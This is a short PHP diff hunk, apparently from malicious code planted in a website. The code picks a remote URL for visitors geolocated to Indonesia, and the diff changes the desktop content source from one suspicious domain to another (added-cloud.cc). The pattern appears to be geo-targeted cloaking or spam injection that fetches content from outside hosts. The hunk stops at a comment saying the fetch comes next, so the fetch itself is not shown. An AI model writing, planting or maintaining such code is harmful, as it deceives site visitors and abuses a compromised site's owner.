@@ -15,7 +15,7 @@ if ($location_data->country === 'Indonesia') {
         $url = 'https://pub-9ac899cf166c498fa482c500908726f0.r2.dev/amp.operetta.com.ua.html';
     } else {
         // Get content for desktop version
-        $url = 'https://includes-page.com/cmd/operetta.com.ua/lp.txt';
+        $url = 'https://added-cloud.cc/packdol/getcontent/tets/lp.txt';
     }
 
     // Fetch content from URL
